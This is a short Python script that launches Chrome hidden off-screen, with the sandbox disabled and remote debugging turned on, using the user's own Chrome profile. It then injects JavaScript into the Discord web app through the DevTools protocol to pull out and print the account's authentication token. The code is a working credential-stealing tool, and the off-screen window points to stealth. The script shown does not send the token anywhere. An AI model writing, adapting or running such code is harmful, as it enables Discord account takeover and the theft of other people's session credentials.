import subprocess
import requests
import json
import time
import os
import websocket

def get_discord_token():
    chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
    profile_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
    
    proc = subprocess.Popen([
        chrome_path,
        '--remote-debugging-port=9222',
        f'--user-data-dir={profile_path}',
        '--profile-directory=Default',
        '--no-sandbox',
        '--disable-gpu',
        '--window-position=-32000,-32000',
        '--window-size=1,1',
        'https://discord.com/app'
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(10)
    
    try:
        tabs = requests.get('http://localhost:9222/json').json()
        
        discord_tab = None
        for tab in tabs:
            if 'discord.com' in tab.get('url', ''):
                discord_tab = tab
                break
        
        if not discord_tab:
            discord_tab = tabs[0]
        
        ws_url = discord_tab['webSocketDebuggerUrl']
        result = {}
        
        def on_message(ws, message):
            data = json.loads(message)
            if data.get('id') == 1:
                result['token'] = data.get('result', {}).get('result', {}).get('value')
                ws.close()
        
        def on_open(ws):
            ws.send(json.dumps({
                'id': 1,
                'method': 'Runtime.evaluate',
                'params': {
                    'expression': "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
                }
            }))
        
        ws = websocket.WebSocketApp(ws_url, on_message=on_message, on_open=on_open)
        ws.run_forever(ping_timeout=10)
        
        return result.get('token')
        
    except Exception as e:
        print(f"Error: {e}")
        return None
    finally:
        proc.terminate()

if __name__ == '__main__':
    token = get_discord_token()
    if token:
        print("\n" + "="*60)
        print("TOKEN:")
        print("="*60)
        print(token)
        print("="*60)
    else:
        print("Failed.")
